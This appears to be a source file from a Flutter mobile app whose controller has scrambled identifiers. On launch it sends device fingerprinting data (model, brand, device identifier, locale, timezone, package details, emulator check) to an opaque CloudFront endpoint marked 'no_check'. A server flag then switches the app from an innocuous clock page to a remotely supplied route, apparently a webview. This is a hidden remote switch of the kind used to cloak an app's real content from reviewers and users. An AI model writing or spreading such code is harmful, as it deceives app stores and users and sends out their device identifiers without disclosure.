import 'dart:io';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:package_info_plus/package_info_plus.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:get/get.dart';


class StyleTemplateLogic extends GetxController {

  var lanvdqjh = RxBool(false);
  var pjmgrcuyx = RxBool(true);
  var kyotp = RxString("");
  var mkxip = RxBool(false);
  var zmlb = RxBool(true);
  final wvygtdxfjp = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    smte();
  }


  Future<void> smte() async {
    mkxip.value = true;
    zmlb.value = true;
    pjmgrcuyx.value = false;

    wvygtdxfjp.post("https://d1cfo9ak2r90uw.cloudfront.net/atykmefozigslqdcpjvbhrxnw?no_check",data: await ampzudew()).then((value) {
      var ukryq = value.data["ukryq"] as String;
      var tieopj = value.data["tieopj"] as bool;
      if (tieopj) {
        kyotp.value = ukryq;
        ntkg();
      } else {
        dzak();
      }
    }).catchError((e) {
      pjmgrcuyx.value = true;
      zmlb.value = true;
      mkxip.value = false;
    });
  }

  Future<Map<String, dynamic>> ampzudew() async {
    final DeviceInfoPlugin qnkapx = DeviceInfoPlugin();
    PackageInfo pduakt_xjewropu = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var wytomiqv = Platform.localeName;
    var hp_btMkw = currentTimeZone;

    var hp_fXmLayd = pduakt_xjewropu.packageName;
    var hp_JEr = pduakt_xjewropu.version;
    var hp_dCaHu = pduakt_xjewropu.buildNumber;

    var hp_qdXRcP = pduakt_xjewropu.appName;
    var hp_BG = "";
    var hp_BDqUZs  = "";
    var hp_dBULtQGD = "";
    var oyxzi = "";
    var lgdxtahy = "";
    var jsdno = "";
    var utki = "";
    var iepzoxk = "";
    var wembursd = "";


    var hp_LnJE = "";
    var hp_tExMrGsJ = false;

    if (GetPlatform.isAndroid) {
      hp_LnJE = "android";
      var utpkfevio = await qnkapx.androidInfo;

      hp_dBULtQGD = utpkfevio.brand;

      hp_BG  = utpkfevio.model;
      hp_BDqUZs = utpkfevio.id;

      hp_tExMrGsJ = utpkfevio.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hp_LnJE = "ios";
      var udwyngtq = await qnkapx.iosInfo;
      hp_dBULtQGD = udwyngtq.name;
      hp_BG = udwyngtq.model;

      hp_BDqUZs = udwyngtq.identifierForVendor ?? "";
      hp_tExMrGsJ  = udwyngtq.isPhysicalDevice;
    }

    var res = {
      "hp_qdXRcP": hp_qdXRcP,
      "hp_dCaHu": hp_dCaHu,
      "hp_JEr": hp_JEr,
      "hp_fXmLayd": hp_fXmLayd,
      "hp_BG": hp_BG,
      "hp_btMkw": hp_btMkw,
      "hp_dBULtQGD": hp_dBULtQGD,
      "hp_BDqUZs": hp_BDqUZs,
      "wytomiqv": wytomiqv,
      "hp_LnJE": hp_LnJE,
      "hp_tExMrGsJ": hp_tExMrGsJ,
      "oyxzi" : oyxzi,
      "lgdxtahy" : lgdxtahy,
      "jsdno" : jsdno,
      "utki" : utki,
      "iepzoxk" : iepzoxk,
      "wembursd" : wembursd,

    };
    return res;
  }

  Future<void> dzak() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> ntkg() async {
    Get.offNamed("/Outreload");
  }

}
